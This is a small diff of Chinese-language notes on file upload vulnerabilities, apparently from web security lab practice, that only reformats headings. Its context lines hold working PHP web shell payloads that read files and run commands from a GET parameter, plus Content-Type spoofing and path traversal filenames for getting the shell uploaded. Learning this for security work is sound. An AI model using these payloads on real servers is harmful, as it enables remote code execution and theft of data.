@@ -3,7 +3,7 @@
 - 伺服器配置允許某些類型的文件（例如.php和.jsp)
 - 最糟糕的情況是網站允許你上傳伺服器端腳本（例如 PHP、Java 或 Python 檔案）<br>
 
-PHP 
+## PHP 
 - "<"?php echo file_get_contents('/path/to/target/file'); ?">"
 - "<"?php echo system($_GET['command']); ?">"
 - GET /example/exploit.php?command=id HTTP/1.1
@@ -26,7 +26,7 @@ PHP
 **Lab: Web shell upload via Content-Type restriction bypass**
 - change Content-Type : image/jpeg
 
-## Lab: Web shell upload via path traversal
+**Lab: Web shell upload via path traversal**
 - Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
 - filename="..%2fexploit.php"
 - GET /files/exploit.php <br>
